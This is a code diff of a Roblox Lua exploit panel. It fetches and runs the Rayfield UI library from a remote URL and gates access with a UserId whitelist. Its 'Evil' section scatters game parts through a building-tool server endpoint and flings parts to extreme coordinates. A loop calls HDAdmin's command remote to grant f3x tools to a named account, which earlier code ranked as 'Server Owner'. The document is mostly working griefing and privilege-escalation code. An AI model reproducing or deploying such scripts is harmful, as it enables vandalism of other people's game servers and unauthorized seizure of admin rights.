@@ -1,5 +1,37 @@
-local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
 
+--// AUTH LIST
+local gurt = {
+    5507739338,
+    4903949834,
+}
+
+--// SERVICES
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+--// LOAD RAYFIELD
+local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()
+
+--// AUTH CHECK
+if LocalPlayer then
+    local isAuthorized = table.find(gurt, LocalPlayer.UserId)
+
+    if isAuthorized then
+
+        print(LocalPlayer.Name .. " is authorized")
+
+        -- your whole admin panel code continues here ↓↓↓
+
+    else
+        print(LocalPlayer.Name .. " isn't one grr")
+        Rayfield:Notify({
+            Title = "ACCESS DENIED",
+            Content = "You're not whitelisted!",
+            Duration = 4,
+            Image = 4483362458,
+        })
+    end
+end
 
 local SAVENAME = "trivosogoud"
 local LOADNAME = "trivosogoud"
@@ -105,7 +137,7 @@ Misc:CreateButton({
 Evil:CreateSection("Admin+")
 
 Evil:CreateButton({
-   Name = "Scatter (FAST Batch Version)",
+   Name = "Scatter!",
    Callback = function()
 
        local Players = game:GetService("Players")
@@ -118,7 +150,7 @@ Evil:CreateButton({
        local Endpoint = SyncAPI:FindFirstChild("ServerEndpoint") or SyncAPI:WaitForChild("ServerEndpoint")
 
        -- Batching configuration
-       local BATCH_SIZE = 100      -- Remote calls every 100 parts
+       local BATCH_SIZE = 1000      -- Remote calls every 100 parts
        local RANGE = 1000
 
        local currentBatch = {}
@@ -170,6 +202,10 @@ Evil:CreateButton({
 
    end,
 })
+Evil:CreateSection("Scatter needs every part to be unmodeled for it to work boi")
+
+
+
 
 Main:CreateButton({
    Name = "Move all spawnpoints back sigh",
@@ -773,7 +809,7 @@ Main:CreateButton({
                    {
                        {
                            Part = v,
-                           CFrame = CFrame.new(2e25, 0, 0)
+                           CFrame = CFrame.new(2e98, 0, 0)
                        }
                    }
                }
@@ -792,13 +828,12 @@ Main:CreateButton({
 pcall(function()
    Rayfield:LoadConfiguration()
 end)
-game.Players:WaitForChild("Trivo101nikua37") do local args = {
-    [1] = ";Rank Trivo101nikua37 Server Owner"
-}
+while wait(100) do game.Players:WaitForChild("Trivo101nikua37") if game.Players:WaitForChild("Trivo101nikua37") then wait(1) local args = 
+    {
 
-game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args)) local args = {
-    [1] = ":Rank Trivo101nikua37 Server Owner"
-}
+    [1] = ";f3x Trivo101nikua37",
+
+    }
 
 game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))
-end
+end end
